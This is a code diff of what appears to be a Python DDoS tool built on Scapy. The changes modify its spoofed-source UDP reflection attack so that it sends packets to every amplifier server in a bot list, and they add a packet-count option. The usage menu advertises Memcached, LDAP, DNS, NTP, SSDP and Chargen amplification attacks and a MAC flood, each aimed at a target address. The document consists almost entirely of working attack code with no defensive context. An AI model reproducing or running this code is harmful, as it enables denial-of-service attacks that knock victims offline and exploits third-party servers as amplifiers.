@@ -17,18 +17,15 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-A", help="Type attack")
 parser.add_argument("-T", help="Target")
 parser.add_argument("-F", help="File amplification")
-parser.add_argument("-Thread", default=10, help="Thread")
+parser.add_argument("-Thread", default=1, help="Thread")
+parser.add_argument("-Count", default=100, help="Count of sending packet to each host")
 args = parser.parse_args()
 
 def deny(data, port):
-  global servers
-  global current
-  global target
-  amp = servers[current] 
-  current = current + 1
-  amp = re.sub("^\s+|\n|\r|\s+$", '', amp)
-  packet = IP(dst=amp,src=target)/UDP(sport=80, dport=port)/Raw(load=data)
-  send(packet, verbose=0, loop=1)
+  for amp in servers:
+    amp = re.sub("^\s+|\n|\r|\s+$", '', amp)
+    packet = IP(dst=amp,src=target)/UDP(sport=80, dport=port)/Raw(load=data)
+    send(packet, verbose=0, count=count)
 
 
 
@@ -52,14 +49,14 @@ def macflood():
 
 print("""
 
-{1} Memcrashed:    -A 1 -T xx.xx.xx.xx -F bot.txt  -Thread 10    
-{2} LDAP:          -A 2 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{3} DNS:           -A 3 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{4} NTP:           -A 4 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{5} SSDP:          -A 5 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{6} Chargen:       -A 6 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{7} Server:        -A 7 -T xx.xx.xx.xx -F bot.txt  -Thread 10
-{8} Mac-flood:     -A 8 -T FFFF.FFFF.FFFF          -Thread 10
+{1} Memcrashed:    -A 1 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{2} LDAP:          -A 2 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{3} DNS:           -A 3 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{4} NTP:           -A 4 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{5} SSDP:          -A 5 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{6} Chargen:       -A 6 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{7} Server:        -A 7 -T xx.xx.xx.xx -F bot.txt  -Thread 1 -Count 100
+{8} Mac-flood:     -A 8 -T FFFF.FFFF.FFFF          -Thread 1 -Count 100
 
 
   """)
@@ -70,6 +67,7 @@ attack = args.A
 target = args.T
 server = args.F
 numthreads = int(args.Thread)
+count  = int(args.Count)
 
 
 if(len(sys.argv) < 3) or (target == None) or (server == None) or (attack == None):
@@ -111,9 +109,7 @@ def threads(numthreads, arg1, arg2):
   threads = []
   for n in range(numthreads):
     thread = threading.Thread(target=deny, args=(arg1, arg2))
-    thread.daemon = True
     thread.start()
-    time.sleep(1)
 
 def threads2(numthreads, types):
   threads = []
@@ -142,5 +138,5 @@ elif(attack == '7'):
 elif(attack == '8'):
   threads2(numthreads, macflood)
   
-while True:
-  time.sleep(2)
+#  while True:
+#    time.sleep(2)
